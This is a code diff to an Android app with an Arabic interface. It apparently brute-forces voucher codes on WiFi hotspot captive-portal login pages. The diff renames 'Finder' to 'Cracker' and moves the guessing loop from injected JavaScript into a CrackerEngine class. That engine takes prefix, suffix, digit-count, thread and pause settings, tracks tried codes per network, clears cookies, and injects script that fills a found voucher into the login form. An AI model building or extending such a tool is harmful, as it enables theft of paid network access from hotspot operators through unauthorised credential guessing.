@@ -12,11 +12,9 @@ import android.webkit.*;
 import android.widget.*;
 import java.io.InputStream;
 import java.nio.charset.StandardCharsets;
-import java.util.HashSet;
-import java.util.Set;
 import java.net.URI;
 
-public class MainActivity extends Activity {
+public class MainActivity extends Activity implements CrackerEngine.Listener {
     private WebView webView;
     private EditText urlBar;
     private ProgressBar progressBar;
@@ -26,11 +24,11 @@ public class MainActivity extends Activity {
     private EditText etPrefix, etSuffix, etDigits, etAttempts;
     private EditText etPause, etRetry, etStatusEvery, etRttEvery;
     private SharedPreferences prefs;
-    private String finderJs = "";
     private StringBuilder logBuf = new StringBuilder();
     private Handler uiHandler = new Handler(Looper.getMainLooper());
     private boolean logUpdatePending = false;
     private String currentNetwork = "default";
+    private CrackerEngine engine;
 
     @SuppressLint("SetJavaScriptEnabled")
     @Override protected void onCreate(Bundle savedInstanceState) {
@@ -62,15 +60,7 @@ public class MainActivity extends Activity {
         etPause.setText(prefs.getString("pause", "300"));
         etRetry.setText(prefs.getString("retry", "1500"));
         etStatusEvery.setText(prefs.getString("statusEvery", "50"));
-        etRttEvery.setText(prefs.getString("threads", "4"));
-
-        try {
-            InputStream is = getAssets().open("finder.js");
-            byte[] buf = new byte[is.available()];
-            is.read(buf);
-            is.close();
-            finderJs = new String(buf, StandardCharsets.UTF_8);
-        } catch (Exception e) {}
+        etRttEvery.setText(prefs.getString("threads", "3"));
 
         CookieManager.getInstance().setAcceptCookie(true);
         CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
@@ -81,7 +71,6 @@ public class MainActivity extends Activity {
         s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
         s.setAllowFileAccess(true);
         webView.setBackgroundColor(0xFF000000);
-        webView.addJavascriptInterface(new Bridge(), "AndroidBridge");
 
         webView.setWebViewClient(new WebViewClient() {
             @Override public void onPageFinished(WebView v, String u) {
@@ -103,10 +92,9 @@ public class MainActivity extends Activity {
         findViewById(R.id.btnFinder).setOnClickListener(v -> {
             panel.setVisibility(panel.getVisibility() == View.VISIBLE ? View.GONE : View.VISIBLE);
         });
-
-        findViewById(R.id.btnStart).setOnClickListener(v -> startFinder());
-        findViewById(R.id.btnStop).setOnClickListener(v -> stopFinder());
-        findViewById(R.id.btnClear).setOnClickListener(v -> clearProgress());
+        findViewById(R.id.btnStart).setOnClickListener(v -> startCracker());
+        findViewById(R.id.btnStop).setOnClickListener(v -> stopCracker());
+        findViewById(R.id.btnClear).setOnClickListener(v -> clearAll());
 
         webView.loadUrl("http://connectivitycheck.gstatic.com/generate_204");
     }
@@ -118,23 +106,23 @@ public class MainActivity extends Activity {
         webView.loadUrl(u);
     }
 
-    private void clearProgress() {
+    private void clearAll() {
         new AlertDialog.Builder(this)
-            .setTitle("مسح كل شيء والبدء من جديد")
-            .setMessage("سيتم مسح كل الأرقام المجربة والكوكيز، وسيبدأ التطبيق من الصفر لهذه الشبكة. هل أنت متأكد؟")
+            .setTitle("مسح شامل")
+            .setMessage("سيتم مسح كل الأرقام المجربة والكوكيز. هل أنت متأكد؟")
             .setPositiveButton("نعم", (d, w) -> {
                 prefs.edit().remove("tried_" + currentNetwork).apply();
                 CookieManager.getInstance().removeAllCookies(null);
                 CookieManager.getInstance().flush();
                 logBuf.setLength(0);
-                logText.setText("🗑️ تم مسح السجل والكوكيز. اضغط ابدأ للتخمين من جديد.\n");
-                Toast.makeText(this, "تم المسح الشامل", Toast.LENGTH_SHORT).show();
+                logText.setText("🗑️ تم المسح. اضغط ابدأ من جديد.\n");
+                Toast.makeText(this, "تم المسح", Toast.LENGTH_SHORT).show();
             })
             .setNegativeButton("إلغاء", null)
             .show();
     }
 
-    private void startFinder() {
+    private void startCracker() {
         String url = webView.getUrl();
         if (url == null || !url.contains("/")) {
             Toast.makeText(this, "افتح صفحة الدخول أولاً", Toast.LENGTH_SHORT).show();
@@ -142,10 +130,8 @@ public class MainActivity extends Activity {
         }
         if (!url.contains("/login")) url = url.replaceAll("/+$", "") + "/login";
 
-        try {
-            currentNetwork = new URI(url).getHost();
-            if (currentNetwork == null) currentNetwork = "default";
-        } catch (Exception e) { currentNetwork = "default"; }
+        try { currentNetwork = new URI(url).getHost(); }
+        catch (Exception e) { currentNetwork = "default"; }
 
         String prefix = etPrefix.getText().toString().trim();
         String suffix = etSuffix.getText().toString().trim();
@@ -154,7 +140,7 @@ public class MainActivity extends Activity {
         int pause = pi(etPause, 300);
         int retry = pi(etRetry, 1500);
         int statusEvery = pi(etStatusEvery, 50);
-        int threads = pi(etRttEvery, 4);
+        int threads = pi(etRttEvery, 3);
 
         prefs.edit()
             .putString("prefix", prefix).putString("suffix", suffix)
@@ -166,38 +152,19 @@ public class MainActivity extends Activity {
             .putString("threads", String.valueOf(threads))
             .apply();
 
-        Set<String> triedSet = prefs.getStringSet("tried_" + currentNetwork, new HashSet<>());
-        StringBuilder triedJson = new StringBuilder("[");
-        int c = 0;
-        for (String t : triedSet) {
-            if (c > 0) triedJson.append(",");
-            triedJson.append("\"").append(t).append("\"");
-            c++;
-        }
-        triedJson.append("]");
-
         logBuf.setLength(0);
-        logText.setText("📊 الأرقام المجربة سابقاً في هذه الشبكة: " + c + "\n\n");
+        logText.setText("");
         voucherResult.setVisibility(View.GONE);
         statusText.setText("جاري التخمين...");
 
-        String cfg = "window.FINDER_CONFIG={"
-            + "url:'" + url + "',"
-            + "prefix:'" + prefix + "',"
-            + "suffix:'" + suffix + "',"
-            + "digits:" + digits + ","
-            + "attempts:" + attempts + ","
-            + "pause:" + pause + ","
-            + "retryDelay:" + retry + ","
-            + "statusEvery:" + statusEvery + ","
-            + "threads:" + threads + ","
-            + "tried:" + triedJson.toString() + "};";
-        webView.evaluateJavascript(cfg, null);
-        webView.evaluateJavascript(finderJs, null);
+        engine = new CrackerEngine(
+            this, prefs, currentNetwork, url, prefix, suffix, digits, attempts,
+            threads, pause, pause * 2, statusEvery, 5000, retry);
+        engine.start();
     }
 
-    private void stopFinder() {
-        webView.evaluateJavascript("window.stopFinder && window.stopFinder();", null);
+    private void stopCracker() {
+        if (engine != null) engine.stop();
         statusText.setText("متوقف");
     }
 
@@ -206,68 +173,40 @@ public class MainActivity extends Activity {
         catch (Exception ex) { return def; }
     }
 
-    private void appendLog(String msg) {
-        logBuf.append(msg).append('\n');
-        if (logBuf.length() > 20000) logBuf.delete(0, 15000);
-        
-        if (!logUpdatePending) {
-            logUpdatePending = true;
-            uiHandler.postDelayed(() -> {
-                logText.setText(logBuf.toString());
-                logScroll.post(() -> logScroll.fullScroll(ScrollView.FOCUS_DOWN));
-                logUpdatePending = false;
-            }, 100);
-        }
+    @Override public void onLog(final String msg) {
+        runOnUiThread(() -> {
+            logBuf.append(msg).append('\n');
+            if (logBuf.length() > 25000) logBuf.delete(0, 15000);
+            if (!logUpdatePending) {
+                logUpdatePending = true;
+                uiHandler.postDelayed(() -> {
+                    logText.setText(logBuf.toString());
+                    logScroll.post(() -> logScroll.fullScroll(ScrollView.FOCUS_DOWN));
+                    logUpdatePending = false;
+                }, 100);
+            }
+        });
     }
 
-    public class Bridge {
-        @JavascriptInterface public void log(String m) {
-            runOnUiThread(() -> appendLog(m));
-        }
-        @JavascriptInterface public void clearCookies() {
-            runOnUiThread(() -> {
-                CookieManager.getInstance().removeAllCookies(null);
-                CookieManager.getInstance().flush();
-            });
-        }
-        @JavascriptInterface public void saveTried(String v) {
-            Set<String> triedSet = new HashSet<>(prefs.getStringSet("tried_" + currentNetwork, new HashSet<>()));
-            triedSet.add(v);
-            // الحد الأقصى 50000 لتجنب بطء الهاتف
-            if (triedSet.size() > 50000) {
-                java.util.List<String> list = new java.util.ArrayList<>(triedSet);
-                triedSet = new HashSet<>(list.subList(list.size() - 50000, list.size()));
-            }
-            prefs.edit().putStringSet("tried_" + currentNetwork, triedSet).apply();
-        }
-        @JavascriptInterface public void progress(int c, int t, String v) {
-            runOnUiThread(() -> statusText.setText("[" + c + "/" + t + "] " + v));
-        }
-        @JavascriptInterface public void found(String v, String j) {
-            runOnUiThread(() -> {
-                appendLog("═══════════════════════════════════");
-                appendLog("✅✅✅ وجد الكرت: " + v);
-                appendLog("═══════════════════════════════════");
-                voucherResult.setText("✅ الكرت: " + v);
-                voucherResult.setVisibility(View.VISIBLE);
-                statusText.setText("✅ وجد: " + v);
-                Toast.makeText(MainActivity.this, "✅ " + v, Toast.LENGTH_LONG).show();
-                
-                String js = "javascript:(function() {" +
-                    "var inputs = document.querySelectorAll('input');" +
-                    "for (var i=0; i<inputs.length; i++) {" +
-                    "  var inp = inputs[i];" +
-                    "  if (inp.type === 'text' || inp.type === 'tel' || inp.name.includes('username') || inp.id.includes('username')) {" +
-                    "    inp.value = '" + v + "';" +
-                    "    inp.dispatchEvent(new Event('input', {bubbles:true}));" +
-                    "    inp.dispatchEvent(new Event('change', {bubbles:true}));" +
-                    "    break;" +
-                    "  }" +
-                    "}" +
-                    "})()";
-                webView.evaluateJavascript(js, null);
-            });
-        }
+    @Override public void onProgress(final int cur, final int total, final String v) {
+        runOnUiThread(() -> statusText.setText("[" + cur + "/" + total + "] " + v));
+    }
+
+    @Override public void onFound(final String voucher, final String statusJson) {
+        runOnUiThread(() -> {
+            onLog("═══════════════════════════════════");
+            onLog("✅✅✅ وجد الكرت: " + voucher);
+            onLog("═══════════════════════════════════");
+            voucherResult.setText("✅ الكرت: " + voucher);
+            voucherResult.setVisibility(View.VISIBLE);
+            statusText.setText("✅ وجد: " + voucher);
+            Toast.makeText(this, "✅ " + voucher, Toast.LENGTH_LONG).show();
+            String js = "(function(){var i=document.querySelectorAll('input');" +
+                "for(var k=0;k<i.length;k++){var x=i[k];" +
+                "if(x.type==='text'||x.name==='username'||x.id.indexOf('username')>=0||x.id.indexOf('voucher')>=0){" +
+                "x.value='"+voucher+"';x.dispatchEvent(new Event('input',{bubbles:true}));break;}}})()";
+            webView.evaluateJavascript(js, null);
+        });
     }
 
     @Override public void onBackPressed() {
